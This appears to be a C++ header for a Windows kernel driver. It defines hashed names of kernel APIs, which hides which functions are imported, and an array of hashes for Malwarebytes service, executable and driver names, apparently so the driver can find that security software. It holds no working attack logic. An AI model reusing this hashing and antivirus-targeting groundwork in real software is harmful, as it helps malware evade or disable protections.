#pragma once
#include <ntifs.h>  
#include <intrin.h> 
#include <cstdarg>    
#include <cstddef>    
#include <winsmcrd.h>
#include <cstdint>
#include <ntddk.h>
#include "nt_structs.h"


#define OBGetObjectType_HASH						0x6246ac8b9eb0daa4
#define ExAllocatePoolWithTag_HASH					0xe7c4d473c919c038
#define ExFreePoolWithTag_HASH						0x175d6b13f09b5f2b
#define PsLookupProcessByProcessId_HASH				0xb7eac87c5d15bdab
#define PsGetProcessImageFileName_HASH				0xb6824094e0503f10
#define GetIoDriverObjectType_t_HASH				0xc0892385cfffae01
#define PsGetProcessPeb_t_HASH						0x3c1a868596349c67

namespace globals {

	extern uintptr_t stored_one;
	extern _OBJECT_TYPE* stored_two;


	// AV_Hashes to be added to defensive iterations list
	inline constexpr UINT64 AV_Hashes[] = {
		0x553d6130527311f4,		// MBAMService.exe
		0x35462151a14026aa,		// MalwareBytes.exe
		0x12a113f555b86193		// mbam.sys
	};


}